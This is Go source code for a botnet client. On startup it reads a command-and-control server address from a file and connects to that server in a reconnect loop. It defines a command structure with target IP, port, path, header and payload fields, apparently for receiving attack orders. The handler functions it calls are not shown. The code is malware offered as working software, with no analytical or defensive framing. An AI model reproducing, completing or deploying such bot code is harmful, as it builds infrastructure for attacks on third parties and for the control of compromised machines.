package main

import (
	"fmt"
	"log"
	"net"
	"time"
)

const (
	c2File      = "./serverfile/c2.txt"
	retryPeriod = 10 * time.Second
)

// Parse JSON data into a struct to avoid type assertions
type BotCommand struct {
	Method  string `json:"method"`
	IP      string `json:"ip"`
	Port    int    `json:"port"`
	Path    string `json:"path"`
	Header  string `json:"header"`
	Payload string `json:"payload"`
}

func main() {
	// Log startup information
	log.Println("Bot client started")

	// Initialize configuration
	initConfig()

	// Read C2 address
	c2Addr := readC2Address()
	log.Printf("C2 server address: %s", c2Addr)

	// Main loop - connect to C2 server
	for {
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:80", c2Addr))
		if err != nil {
			log.Printf("Failed to connect to C2 server: %v, retrying in %s...", err, retryPeriod)
			time.Sleep(retryPeriod)
			continue
		}

		log.Printf("Successfully connected to C2 server: %s", c2Addr)
		handleC2Connection(conn)
		conn.Close()
		log.Println("Connection interrupted, preparing to reconnect...")

		// Prevent excessive logs due to rapid reconnection attempts
		time.Sleep(2 * time.Second)
	}
}
